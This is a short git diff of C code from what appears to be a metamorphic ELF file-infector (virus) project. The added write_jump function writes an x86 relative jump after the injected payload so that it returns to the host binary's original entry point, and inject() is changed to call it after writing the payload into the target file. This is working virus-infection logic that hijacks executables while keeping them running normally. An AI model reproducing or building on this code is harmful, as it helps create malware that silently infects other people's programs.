@@ -65,6 +65,18 @@ int FORCE_INLINE metamorph_section(t_data data)
 }
 
 
+void FORCE_INLINE write_jump(t_data data)
+{
+	char	jmp_code[] = "\xe9\xde\xad\xbe\xef";
+	int	jmp_addr;
+
+	jmp_addr = data.bin.old_entry - (data.bin.new_entry + data.infos.pl_size);
+	jmp_addr -= 5;
+	ft_memcpy(jmp_code + 1, (char *)&jmp_addr, sizeof(int));
+	//LSEEK(data.fd, -2, SEEK_CUR);
+	WRITE(data.fd, jmp_code, sizeof(jmp_code) - 1);
+}
+
 int inject(t_data data)
 {
 	u64 offset;
@@ -86,6 +98,7 @@ int inject(t_data data)
 	/* write to file */
 	payload_addr = get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload);
 	WRITE(data.fd, payload_addr, data.infos.pl_size);
+	write_jump(data);
 	CLOSE(data.fd);
 	ft_putchar('6');
 	ft_putchar('\n');
